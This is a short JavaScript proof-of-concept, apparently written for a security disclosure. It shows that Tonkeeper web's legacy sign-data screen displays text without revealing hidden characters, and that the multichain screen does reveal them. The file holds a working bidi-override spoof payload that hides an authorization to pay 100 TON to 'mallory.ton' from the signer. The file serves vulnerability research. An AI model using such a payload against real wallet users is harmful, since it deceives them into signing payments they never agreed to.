// KPR-B-02 PoC: legacy signData text rendering vs multichain reveal.
// The function below is copied VERBATIM from
// packages/core/src/service/walletConnect/wcRequestSummary.ts (lines 192-208,
// sha256 ba717d4440422e5455b69e83b5b11c78ea14f35498a7e0b037f42ed558acb2ee at
// tonkeeper-web f9073ff). The legacy SignDataNotification renders params.text
// with NO call to this function (grep: revealHiddenCharacters appears only in
// multichain files); the multichain TonConnectSignDataSheet applies it and
// shows a red warning when hasHidden is true.

const HIDDEN_CHARACTERS = /[\p{Cf}\p{Variation_Selector}ᅟᅠㅤﾠ]|[^\P{Cc}\t\n\r]/gu;
const revealHiddenCharacters = (text) => {
    let hasHidden = false;
    const revealed = text.replace(HIDDEN_CHARACTERS, char => {
        hasHidden = true;
        const code = char.codePointAt(0).toString(16).toUpperCase().padStart(4, '0');
        return `[U+${code}]`;
    });
    return { text: revealed, hasHidden };
};

// Crafted signData `text` payload (logical byte order). A dApp that parses the
// LOGICAL string sees the trailing clause; a human reading the RENDERED string
// in a bidi-capable UI reads the visually reordered form (see b02-visual-order.py
// for the UBA visual order). U+202E = RIGHT-TO-LEFT OVERRIDE, U+202C = POP
// DIRECTIONAL FORMATTING, U+200B = ZERO WIDTH SPACE, U+0007 = BEL.
const spoof =
  'I agree to receive 100 TON from alice.ton\n' +
  'Terms: no payment required\u202E\u200B\u0007' +
  ' — I authorize paying 100 TON to mallory.ton\u202C';

console.log('== LOGICAL STRING (what is signed: signData binds domain+timestamp+payload) ==');
console.log(JSON.stringify(spoof));
console.log('code points:', [...spoof].map(c => 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')).join(' '));

console.log('\n== LEGACY SignDataNotification (non-multichain accounts) ==');
console.log('rendered = params.text verbatim, no transform, no warning.');
console.log(spoof);

console.log('\n== MULTICHAIN TonConnectSignDataSheet ==');
const r = revealHiddenCharacters(spoof);
console.log('hasHidden:', r.hasHidden, '-> red warning shown:', r.hasHidden);
console.log(r.text);

// Team's own test vector (wcRequestSummary.test.ts:226) sanity check:
const t = revealHiddenCharacters('pay‮eht​\u0007');
console.log('\n== sanity: team test vector ==');
console.log(JSON.stringify(t));
console.log('expected hasHidden=true:', t.hasHidden === true);
